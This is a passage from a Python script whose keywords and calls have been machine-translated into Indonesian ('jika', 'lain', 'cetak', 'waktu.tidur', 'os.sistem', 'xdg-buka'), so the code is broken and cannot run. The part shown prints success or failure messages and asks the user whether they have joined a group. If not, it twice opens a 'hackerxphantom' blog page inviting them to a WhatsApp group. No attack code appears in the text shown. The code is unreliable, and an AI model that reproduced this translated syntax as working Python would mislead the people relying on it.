		waktu . tidur ( 40 )
		jika  tautan1  ==  0 :
			print ( f" { G } Berhasil" )
			lulus
		lain :
			print ( f" { R } [×] Gagal " )
		waktu . tidur ( 0.2 )
	kembali  utama ()

def  MSG ():
	cetak ( Y )
	YTC  =  input ( "Sudahkah Anda Bergabung dengan Kami? (Y/T): " )
	jika  YTC  ==  'Y'  atau  YTC  ==  'y' :
		cetak ( G )
		print ( "Terima Kasih Telah Bergabung Dengan Kami... \n " )
		waktu . tidur ( 4 )
		print ( "Alat inisialisasi..." )
		waktu . tidur ( 4 )		
		cetak ( W  +  " \n \n " )
		utama ()
	elif  YTC  ==  'N'  atau  YTC  ==  'n' :
		cetak ( "" )
		os . sistem ( "xdg-buka https://hackerxphantom.blogspot.com/p/join-whatsapp-group.html" )
		waktu . tidur ( 8 )
		os . sistem ( "xdg-buka https://hackerxphantom.blogspot.com/p/join-whatsapp-group.html" )
		waktu . tidur ( 3 )
		cetak ( W  +  " \n \n " )
		utama ()

MSG ()
